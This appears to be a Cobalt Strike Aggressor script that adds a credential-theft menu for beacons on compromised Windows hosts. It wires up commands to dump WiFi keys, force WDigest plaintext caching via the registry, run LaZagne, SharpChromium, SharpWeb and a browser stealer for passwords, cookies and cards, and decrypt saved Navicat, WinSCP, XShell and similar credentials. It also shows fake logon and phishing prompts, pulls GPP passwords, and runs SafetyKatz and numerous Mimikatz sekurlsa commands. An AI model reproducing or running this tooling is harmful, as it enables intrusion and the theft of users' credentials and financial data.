##############################
#                            #
#                            #
#                            #
#       Xway.cn@panda        #
#                            #
#                            #
#                            #
##############################
menu "获取凭证" {
				item "获取连接过的wifi" {
			local('$bid');
			foreach $bid ($1){
				bshell($1, "netsh wlan show profiles");
			}
		}
			    item "获取wifi密码" {
             prompt_text("wifi名?", "", lambda({
            bshell(@ids, "netsh wlan show profile name=\"$1\" key=clear");
        }, @ids => $1));
    }	
				item "win2012修改注册表dump明文" {
			local('$bid');
			foreach $bid ($1){
				bshell($1, "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
			}
		}



    	menu "LaZagne"{
    		item "上传lazagne"{
        	local('$bid');
        	foreach $bid ($1){
            bupload($1, "script/lazagne.exe");
        		}
        	}
        	item "运行LaZagne" {
			$bid = $1['@'];
			$dialog = dialog("LaZagne", %(args => "",bid => $bid), &lazagne_password);
			drow_text($dialog, "args", "args:  ");
            dbutton_action($dialog, "RUN");
			dialog_show($dialog);
        	}
        	item "删除lazagne"{
        	local('$bid');
        	foreach $bid ($1){
            	bshell($1, "del /f /s /q lazagne.exe");
        	}
		}

    	}


sub lazagne_password{
	$arg = join(' ', @($3['args']));
	bshell($bid, "lazagne.exe $arg");
}

		    	item "获取Navicat凭证"{
    		local('$bid');
               foreach $bid ($1){
                   navicat_password($bid);
            }
    	}
		
sub navicat_password{
	$binary = "script/navicatpwd.exe";
	$help = "Automatic access to Navicat connection information and password";
	beacon_command_register("navicat", $help, "Use: navicat <Automatically export all and decrypt>\nnavicat 12 <Decrypt with 12 algorithms> OR navicat 15057D7BA390\nnavicat 15057D7BA390 12<Decrypt the password of parameter one with 12 algorithm>\n\n$help");
	if(!-exists $binary)
	{
		berror($1, "Navicat binary cannot be found at $binary");
		return;
	}
	bexecute_assembly($1, $binary);
}
			item "Stealer" {
			$bid = $1;
			$dialog = dialog("Stealer", %(Type => "PASSWORDS",bid => $bid), &Stealer);
			dialog_description($dialog, "Google Chrome、Opera、Chromium、Brave-Browser、Epic Privacy Browser、Amigo、Vivaldi、Orbitum、Atom、Kometa、Comodo Dragon、Torch、Slimjet、360Browser、Maxthon3、K-Melon、Sputnik、Nichrome、CocCoc Browser、Uran、Chromodo、Yandex (old)");
			drow_combobox($dialog, "Type", "Type:", @("PASSWORDS", "credit_cards","history","bookmarks","cookies"));
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub Stealer {
	bexecute_assembly($bid, script_resource("/script/Stealer.exe"), $3['Type']);
}
menu "sharpchrome" {

		item "提取以下三项全部信息"{
			local('$bid');
				foreach $bid ($1){
					sharpchromeall($bid);
				}
			}

		item "提取浏览器Cookies"{
			local('$bid');
				foreach $bid ($1){
					sharpchromecookies($bid);
				}
			}

		item "提取浏览器历史记录"{
			local('$bid');
				foreach $bid ($1){
					sharphistory($bid);
				}
			}

		item "提取保存的密码"{
			local('$bid');
				foreach $bid ($1){
					sharplogins($bid);
				}
			}
sub sharpchromeall{
bexecute_assembly($1, script_resource('/script/SharpChromium.exe'), "all");
}

sub sharpchromecookies{
bexecute_assembly($1, script_resource('/script/SharpChromium.exe'), "cookies");
}

sub sharphistory{
bexecute_assembly($1, script_resource('/script/SharpChromium.exe'), "history");
}


sub sharplogins{
bexecute_assembly($1, script_resource('/script/SharpChromium.exe'), "logins");
}
	}
menu "SharpWeb" {

		item "提取所有浏览器凭证"{
			local('$bid');
				foreach $bid ($1){
					sharpweball($bid);
				}
			}

		item "提取Chrome凭证"{
			local('$bid');
				foreach $bid ($1){
					sharpwebchrome($bid);
				}
			}

		item "提取Edge凭证"{
			local('$bid');
				foreach $bid ($1){
					sharpwebedge($bid);
				}
			}
		item "提取FireFox凭证"{
			local('$bid');
				foreach $bid ($1){
					sharpwebfirefox($bid);
				}
			}

sub sharpweball{
bexecute_assembly($1, script_resource('/script/SharpWeb.exe'), "all");
}

sub sharpwebfirefox{
bexecute_assembly($1, script_resource('/script/SharpWeb.exe'), "firefox");
}

sub sharpwebchrome{
bexecute_assembly($1, script_resource('/script/SharpWeb.exe'), "chrome");
}

sub sharpwebedge{
bexecute_assembly($1, script_resource('/script/SharpWeb.exe'), "edge");
}

		} 
    menu "SharpDecryptPwd-1" {
        
		item "SharpDecryptPwd" {
			$bid = $1['@'];
			$dialog = dialog("SharpDecryptPwd", %(type => "-WinSCP",bid => $bid), &SharpDecryptPwd);
			drow_combobox($dialog, "type", "Type:", @("-TeamViewer", "-FileZilla", "-WinSCP","-NavicatCrypto","-Browser"));
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
	item "DecryptXShell" {
			$bid = $1['@'];
			$dialog = dialog("DecryptXShell", %(type => "-Xmangager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &DecryptXShell);
			dialog_description($dialog, "DecryptXShell");
			drow_combobox($dialog, "type", "Type:", @("-Xmangager"));
			drow_text($dialog, "path", "Sessions Path:  ");
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
		
    }
sub SharpDecryptPwd {
	
		bexecute_assembly($bid, script_resource("/script/SharpDecryptPwd.exe"), $3['type']);
	
}
sub DecryptXShell {
		$arg = join(' ', @($3['type'],"-p",$3['path']));
		bexecute_assembly($bid, script_resource("/script/SharpDecryptPwd.exe"), $arg);
}	
    menu "SharpDecryptPwd-2" {
        
		item "SharpDecryptPwd" {
			$bid = $1['@'];
			$dialog = dialog("SharpDecryptPwd", %(type => "-Foxmail",bid => $bid), &SharpDecryptPwd2);
			drow_combobox($dialog, "type", "Type:", @("-Navicat", "-TeamViewer", "-FileZilla","-Foxmail","-RealVNC","-TortoiseSVN","-WinSCP"));
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
	item "DecryptXShell" {
			$bid = $1['@'];
			$dialog = dialog("DecryptXShell", %(type => "-Xmangager",path => "D:\\xshell\\Xshell\\Sessions",bid => $bid), &DecryptXShell2);
			dialog_description($dialog, "DecryptXShell");
			drow_combobox($dialog, "type", "Type:", @("-Xmangager"));
			drow_text($dialog, "path", "Sessions Path:  ");
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
		
    }
sub SharpDecryptPwd2 {
	
		bexecute_assembly($bid, script_resource("/script/SharpDecryptPwd2.exe"), $3['type']);
	
}
sub DecryptXShell2 {
		$arg = join(' ', @($3['type'],"-p",$3['path']));
		bexecute_assembly($bid, script_resource("/script/SharpDecryptPwd2.exe"), $arg);
}	      
		  item "FakeLogonScreen" {
			$bid = $1;
			$dialog = dialog("FakeLogonScreen", %(bid => $bid), &FakeLogonScreen);
			dialog_description($dialog, "SharpLocker会弹出一个假的Windows锁定屏幕，帮助获得当前的用户凭据，所有输出都将发送到控制台。");
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub FakeLogonScreen {
	bexecute_assembly($bid, script_resource("/script/FakeLogonScreen.exe"), "");
}

			item "CredPhisher" {
			$bid = $1['@'];
			$dialog = dialog("CredPhisher", %(content => "",bid => $bid), &CredPhisher);
			dialog_description($dialog, "弹出安全认证登录框，钓鱼凭证。");
			drow_text($dialog, "content", "content:  ");	
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }

sub CredPhisher {
		$arg = join('',@("",$3['content']));
		bexecute_assembly($bid, script_resource("/script/CredPhisher.exe"), $arg);
}	

		item "Net-GPPPassword" {
			bexecute_assembly($1, script_resource("/script/Net-GPPPassword.exe"), "");
		}
	

		item "SafetyKatz" {
			bexecute_assembly($1, script_resource("/script/SafetyKatz.exe"), "");
		}

menu "Mimikatz" {
		item "Mimikatz Logon Passwords"{
			local('$bid');
				foreach $bid ($1){
					logonpasswords($bid);
				}
			}
		item "Mimikatz WDigest Credentials"{
			local('$bid');
				foreach $bid ($1){
					wdigest($bid);
				}
			}
		item "Mimikatz Kerberos Credentials"{
			local('$bid');
				foreach $bid ($1){
					kerberos($bid);
				}
			}
		item "Mimikatz MSV LM & NTLM Passwords"{
			local('$bid');
				foreach $bid ($1){
					msv($bid);
				}
			}
		item "Mimikatz TsPkg Passwords"{
			local('$bid');
				foreach $bid ($1){
					tspkg($bid);
				}
			}
		item "Mimikatz LiveSSP passwords"{
			local('$bid');
				foreach $bid ($1){
					livessp($bid);
				}
			}
		item "Mimikatz SSP passwords"{
			local('$bid');
				foreach $bid ($1){
					ssp($bid);
				}
			}

		item "Mimikatz Dump Trust"{
			local('$bid');
				foreach $bid ($1){
					trust($bid);
				}
			}

		item "Mimikatz Backup Keys"{
			local('$bid');
				foreach $bid ($1){
					backupkeys($bid);
				}
			}

		item "Mimikatz Tickets"{
			local('$bid');
				foreach $bid ($1){
					tickets($bid);
				}
			}

		item "Mimikatz ekeys"{
			local('$bid');
				foreach $bid ($1){
					ekeys($bid);
				}
			}

		item "Mimikatz DPAPI"{
			local('$bid');
				foreach $bid ($1){
					dpapi($bid);
				}
			}

		item "Mimikatz DPAPI System Secret"{
			local('$bid');
				foreach $bid ($1){
					dpapisystem($bid);
				}
			}

		item "Mimikatz Credential Manager"{
			local('$bid');
				foreach $bid ($1){
					credman($bid);
				}
			}


}
sub logonpasswords{

bmimikatz($1, "sekurlsa::logonpasswords");

}
sub wdigest{

bmimikatz($1, "sekurlsa::wdigest");

}
sub kerberos{

bmimikatz($1, "sekurlsa::kerberos");

}
sub msv{

bmimikatz($1, "sekurlsa::msv");

}
sub tspkg{

bmimikatz($1, "sekurlsa::tspkg");

}
sub livessp{

bmimikatz($1, "sekurlsa::livessp");

}
sub ssp{

bmimikatz($1, "sekurlsa::ssp");

}


sub trust{

bmimikatz($1, "sekurlsa::trust");

}
sub backupkeys{

bmimikatz($1, "sekurlsa::backupkeys");

}
sub tickets{

bmimikatz($1, "sekurlsa::tickets");

}
sub ekeys{

bmimikatz($1, "sekurlsa::ekeys");

}

sub dpapi{

bmimikatz($1, "sekurlsa::dpapi");

}

sub dpapisystem{

bmimikatz($1, "sekurlsa::dpapi");

}

sub credman{

bmimikatz($1, "sekurlsa::credman");

}


        } 

   
    









